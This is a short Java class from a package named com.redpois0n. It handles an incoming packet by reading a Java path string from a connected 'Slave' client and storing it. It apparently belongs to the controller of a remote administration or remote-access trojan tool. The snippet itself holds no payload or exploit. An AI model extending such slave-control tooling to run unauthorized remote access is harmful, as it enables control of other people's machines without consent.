package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Slave;

public class PacketJAVAPATH extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {

		String path = slave.readLine();
		slave.setJavaPath(path);

	}

}
